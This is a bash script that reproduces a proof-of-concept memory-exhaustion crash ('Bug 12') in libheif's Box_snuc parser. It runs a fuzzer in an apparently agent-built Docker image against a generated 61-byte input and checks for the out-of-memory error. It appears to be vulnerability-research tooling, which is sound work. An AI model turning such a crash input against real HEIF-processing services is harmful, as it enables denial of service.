#!/bin/bash
# Build and run script for Bug 12 POC: Box_snuc memory exhaustion
#
# Requires: docker image vulagent/libheif:latest
# Output:   fuzzer_output_validated.txt (in same directory)
#
# Expected: libFuzzer "out-of-memory (malloc(943734848))" error with crash at
#           Box_snuc::parse() / unc_boxes.cc:1323 (nuc_gains.resize(num_pixels))

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POC_INPUT="${SCRIPT_DIR}/poc_input"
OUT_LOG="${SCRIPT_DIR}/fuzzer_output_validated.txt"

# Regenerate poc_input if missing
if [ ! -f "${POC_INPUT}" ]; then
  echo "[*] Generating poc_input..."
  python3 "${SCRIPT_DIR}/gen_poc.py"
fi

# Create a temp dir for the fuzzer corpus
TMP_CORPUS=$(mktemp -d)
cp "${POC_INPUT}" "${TMP_CORPUS}/"

echo "[*] Running box_fuzzer with rss_limit_mb=512 against poc_input (61 bytes)..."
echo "[*] Expected: out-of-memory crash at Box_snuc::parse() unc_boxes.cc:1323"

docker run --rm \
  -v "${TMP_CORPUS}:/tmp/poc" \
  -e ASAN_OPTIONS="detect_leaks=0" \
  vulagent/libheif:latest \
  bash -c '/out/asan/box_fuzzer -rss_limit_mb=512 /tmp/poc 2>&1; exit 0' \
  | tee "${OUT_LOG}" || true

rm -rf "${TMP_CORPUS}"

echo ""
echo "[*] Output saved to: ${OUT_LOG}"
if grep -q "out-of-memory" "${OUT_LOG}"; then
  echo "[*] CONFIRMED: OOM triggered as expected."
  grep "unc_boxes.cc" "${OUT_LOG}" | head -3
else
  echo "[-] WARNING: Expected OOM not found in output."
fi
